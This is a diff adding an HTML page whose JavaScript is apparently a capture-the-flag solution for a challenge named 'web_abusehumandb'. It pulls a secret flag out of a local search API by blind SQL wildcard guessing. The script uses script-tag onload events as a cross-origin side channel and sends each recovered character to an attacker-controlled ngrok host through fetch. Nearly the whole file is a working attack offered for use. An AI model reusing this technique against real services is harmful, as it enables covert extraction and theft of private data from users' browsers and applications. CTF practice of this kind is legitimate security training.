@@ -1,0 +1,58 @@
+<html>
+<!--  
+    javascript to retrieve web_abusehumandb flag using blind SQL searches
+    Serve this page up using `python3 -m http.server` and `ngrok http 8000`
+-->
+<head>
+    <script>
+
+        // I used trial and error to get length of flag, the number of underscores is equal to the length of the flag
+        // since underscore is a wildcard in SQLite we need to make some assumptions here.
+        var flag = '_____________________________';
+        // reduced character set, flags usually dont use a full character set, be careful of wildcards
+        // I havent found a way to escape them
+        const chars = '@!0123456789{}abcdefghijklmnopqrstuvwxyzHTB_';
+
+
+        function replaceChar(string, index, char) {
+            return string.substr(0, index) + char + string.substr(index + 1);
+        }
+
+        function sendFlag() {
+            // replace with the unique part of the ngrok address
+            fetch(`http://<unique>.ngrok.io/?char=${flag}`);
+        }
+
+        function loadScript(guess, char) {
+            return new Promise((res, rej) => {
+                // script will load a text file
+                // onload is triggered if a 200 status is returned when loading a script, this can be used for blind exfil
+                newElem = document.createElement('script');
+                newElem.src = "http://127.0.0.1:1337/api/entries/search?q=" + encodeURIComponent(guess);
+                newElem.id = 'pooscript';  // cleanup, because I am nice.
+                newElem.onload = () => { char == '_' ? rej() : res(char) }; // assume SQL wildcard is underscore in flag
+                document.head.appendChild(newElem);
+            })
+        }
+
+        function getChar(index) {
+            for (var i = 0; i < chars.length; i++) {
+                loadScript(replaceChar(flag, index, chars[i]), chars[i]).then((res) => {
+                    flag = replaceChar(flag, index, res);
+                    sendFlag();
+                });
+                document.querySelector('#pooscript').remove(); // cleanup, because I am nice.
+            }
+        }
+
+        function run() {
+            for (var j = 0; j < flag.length; j++)
+            getChar(j);
+        }
+        
+        run();
+    </script>
+
+</head>
+
+</html>
